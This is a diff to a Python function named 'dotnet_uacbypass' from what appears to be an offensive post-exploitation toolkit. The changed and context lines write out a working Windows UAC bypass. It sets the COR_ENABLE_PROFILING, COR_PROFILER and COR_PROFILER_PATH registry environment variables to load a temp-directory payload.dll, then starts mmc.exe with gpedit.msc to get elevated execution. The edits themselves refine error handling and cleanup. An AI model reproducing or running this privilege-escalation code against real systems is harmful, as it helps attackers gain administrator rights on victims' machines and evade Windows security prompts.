@@ -109,34 +109,39 @@ def dotnet_uacbypass(payload):
 			print_success("Successfully created environment variable (COR_ENABLE_PROFILING)")
 		else:
 			print_error("Unable to create environment variable (COR_ENABLE_PROFILING)")
-			if "error" in Constant.output:
-				dotnet_uacbypass_cleanup()
+			for x in Constant.output:
+				if "error" in x:
+					dotnet_uacbypass_cleanup(path)
+					return False
 
 		if registry().modify_key(hkey="hkcu", path="Environment", name="COR_PROFILER", value="{{{guid}}}".format(guid=guid_array[0]), create=True):
 			print_success("Successfully created environment variable (COR_PROFILER)")
 		else:
 			print_error("Unable to create environment variable (COR_PROFILER)")
-			if "error" in Constant.output:
-				dotnet_uacbypass_cleanup()
+			for x in Constant.output:
+				if "error" in x:
+					dotnet_uacbypass_cleanup(path)
+					return False
 			
 		if registry().modify_key(hkey="hkcu", path="Environment", name="COR_PROFILER_PATH", value=os.path.join(tempfile.gettempdir(), "payload.dll"), create=True):
 			print_success("Successfully created environment variable (COR_PROFILER_PATH)")
 		else:
 			print_error("Unable to create environment variable (COR_PROFILER_PATH)")
-			if "error" in Constant.output:
-				dotnet_uacbypass_cleanup()
+			for x in Constant.output:
+				if "error" in x:
+					dotnet_uacbypass_cleanup(path)
+					return False
 
 		if process().create("mmc.exe", params="gpedit.msc", window=True):
 			print_success("Successfully created mmc.exe process")
+			time.sleep(5)
+			dotnet_uacbypass_cleanup(path)
 		else:
 			print_error("Unable to create mmc.exe process")
-			if "error" in Constant.output:
-				dotnet_uacbypass_cleanup()
-
-		time.sleep(5)
-
-		if not dotnet_uacbypass_cleanup():
-			print_success("All done!")
+			for x in Constant.output:
+				if "error" in x:
+					dotnet_uacbypass_cleanup(path)
+					return False
 	else:
 		print_error("Cannot proceed, invalid payload")
 		return False
